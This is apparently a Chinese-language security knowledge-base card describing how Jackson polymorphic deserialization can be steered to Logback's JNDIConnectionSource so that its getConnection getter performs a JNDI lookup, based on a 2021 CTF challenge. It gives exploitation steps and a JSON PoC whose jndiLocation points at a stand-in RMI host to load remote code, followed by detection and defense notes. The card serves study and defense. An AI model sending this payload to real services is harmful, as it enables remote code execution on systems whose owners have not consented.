---
id: web-java-deser-jackson-logback-jndiconnectionsource-lookup
title: Jackson 多态反序列化到 Logback JNDIConnectionSource：getConnection getter 触发 JNDI lookup
type: scenario
domain: web
path: web/java/deserialization/jackson
technique: jackson-logback-jndiconnectionsource-jndi
aliases:
- Jackson JNDIConnectionSource
- Logback JNDI 链
- JNDIConnectionSource getConnection
- Jackson 反序列化 JNDI
- logback db JNDIConnectionSource
tags:
- java
- deserialization
- jackson
- logback
- jndi
- jndiconnectionsource
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V607
  verified_at: '2026-11-12T18:42:36+08:00'
  notes: 已对照红明谷2021 JavaWeb 全文与图11-13：Shiro jsessionid 绕过、/json 为 Jackson（START_OBJECT/expected START_ARRAY 报错）、JdbcRowSetImpl 被 security 拦截后改用 ch.qos.logback.core.db.JNDIConnectionSource + jndiLocation rmi://...:1099/Exploit 打通并读取 flag。卡片 PoC 的 @class 写法为通用形式，原文截图请求以类名为键；应用侧触发 getConnection 的代码原文未展示，卡内已注明边界并保持 confidence medium。未在本机复跑。
---

## 一句话结论

目标使用 Jackson 处理不可信 JSON 且允许多态类型（默认类型/`@class`/`@type`）时，可把对象实例化成 `ch.qos.logback.core.db.JNDIConnectionSource` 并注入 `jndiLocation`；该 bean 的 `getConnection()` getter 会执行 `InitialContext.lookup(jndiLocation)`，应用的 JSON 流程一旦触发该 getter（回显对象、再次序列化、连接测试等），请求就会打到攻击者 RMI/LDAP 服务，完成 JNDI 注入与远程类加载。

## 原理

- **Jackson 多态反序列化**：开启 default typing 或显式 `@JsonTypeInfo` 时，JSON 里的类型字段决定实例化哪个类，Jackson 会调用无参构造器并按属性名调用 setter。攻击者因此可以创建 classpath 上任意有默认构造器的 bean，并控制其字段。
- **JNDIConnectionSource 的危险 getter**：`ch.qos.logback.core.db.JNDIConnectionSource` 继承 `ConnectionSourceBase`，提供 `setJndiLocation(String)` 与 `getConnection()`；`getConnection()` 会走 `lookupDataSource()`，最终用 `InitialContext.lookup(jndiLocation)` 取得 DataSource 并返回其连接。也就是说，`jndiLocation` 是一个“反序列化后可被 getter 触发的 JNDI 入口”。
- **getter 何时被调用**：Jackson 反序列化本身只调用 setter，不主动调 `getConnection()`；但常见 Web 写法会在反序列化后回显对象（Jackson 再次序列化时按 getter 生成属性，`connection` getter 被调用），或在“连接测试/数据源初始化”等业务代码里读取该属性。原文的 `/json` 接口即 Jackson 处理链，JdbcRowSetImpl/CC/`ClassPathXmlApplicationContext` 被安全机制拦截后，该 bean 成功打通。实际利用时需确认应用的“反序列化后动作”是否会触达该 getter。
- **为什么能绕过黑名单**：黑名单通常只列经典 gadget（JdbcRowSetImpl、TemplatesImpl、CC 等），`JNDIConnectionSource` 是日志组件里的正常 bean，容易被忽略；一旦 HTTP 出站未被限制，JNDI 请求即可把攻击者服务拉进信任边界。
- **JNDI 侧利用**：攻击者 RMI/LDAP 服务可返回远程 Reference 工厂类（低版本 JDK）或返回序列化对象/本地工厂（高版本 JDK 的绕过方式），最终在目标侧加载并执行攻击者类；原文用 RMI 服务实例化恶意类。

## 触发条件

- 应用使用 Jackson 反序列化不可信 JSON，且开启 default typing/多态类型（或存在 `@JsonTypeInfo` 可被滥用的基类）。
- classpath 含 logback-core（`ch.qos.logback.core.db.JNDIConnectionSource` 等 db 包类）。
- 反序列化后的业务动作会调用该 bean 的 `getConnection()`（回显/再序列化/连接测试/初始化）。
- 目标可出网访问攻击者 RMI/LDAP 服务；JDK 允许远程 codebase，或使用本地工厂/serialized data 等绕过。
- 安全机制（黑名单、SecurityManager、WAF）未拦截 logback db 包类与 JNDI 出站。

## 利用步骤

1. 确认目标 JSON 接口由 Jackson 处理，并测试是否存在 default typing（提交带类型字段的对象观察报错/回显）。
2. 启动恶意 RMI/LDAP 服务，准备可执行类或高版本 JNDI 绕过回包。
3. 构造 JSON：类型字段指向 `ch.qos.logback.core.db.JNDIConnectionSource`，`jndiLocation` 指向攻击者地址（具体类型字段名取决于 Jackson 配置，如 `@class`/`@type`/包装数组）。
4. 发送到 JSON 接口；确认应用在反序列化后触发 `getConnection()`（例如响应中出现连接异常/对象回显）。
5. 目标发起 JNDI lookup，攻击者服务返回恶意对象/类，目标加载并执行。
6. 验证：攻击者服务端看到 lookup 请求；目标侧出现命令执行或回连。若未触发，检查 Jackson 是否真的开启多态类型、业务是否调用 getter、logback 版本与出站限制。

## PoC

```json
{
  "@class": "ch.qos.logback.core.db.JNDIConnectionSource",
  "jndiLocation": "rmi://attacker.example:1099/Exploit"
}
```

说明：原文以 Jackson 的 `/json` 接口投递类似对象，配合 RMI 服务实例化恶意类打通；类型字段的具体写法（`@class`/`@type`/外部包装）随 Jackson 配置变化，需按目标调整。文章未展示触发 getter 的应用侧代码，本卡按 gadget 语义补全该边界，confidence 记 medium。

## 变体与关联

- [[web-java-deser-fastjson-jdbc-rowset]]：同为“JSON 反序列化 → JNDI getter”的思路，入口换成 fastjson AutoType，sink 换成 JdbcRowSetImpl。
- [[web-java-deser-rome-objectbean-jdbcrowset-jndi]]：另一条 JNDI getter sink（JdbcRowSetImpl.getDatabaseMetaData），入口是原生 Rome 链。
- [[web-java-deserialization-jndi-ldap-javaserializeddata-deser]]：高版本 JDK 下用 LDAP `javaSerializedData` 绕过 trustURLCodebase 的通道。
- [[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]、[[web-java-deserialization-jndi-tomcat-beanfactory-setter-forcestring-removed]]：JNDI 高版本本地工厂绕过手法。
- 变体：logback 的 `DriverManagerConnectionSource` 等其它 ConnectionSource 子类可作为不同 sink；类型字段可换 Jackson 的其它多态写法。
- 边界：Jackson 未开多态类型、业务不触发 getter、logback-core 不在 classpath、JNDI 被全局过滤或禁止出网时链断。

## 检测与防御

- 检测：JSON 请求中出现 `ch.qos.logback.core.db.JNDIConnectionSource`、`jndiLocation` 字段；反序列化后的对象触发 `InitialContext.lookup`；服务端出现异常 RMI/LDAP 出站（1099/1389 等）。
- 防御：Jackson 关闭 default typing，使用显式 `@JsonTypeInfo` 白名单；升级/移除不必要的 logback db 组件；限制服务端出站 JNDI；JDK 升级并设置 `com.sun.jndi.ldap.object.trustURLCodebase=false`；JEP 290 与业务层类型白名单。
- 响应：保留 JSON 请求与网络日志，确认 lookup 目标与返回内容，排查同接口其它多态类型滥用。
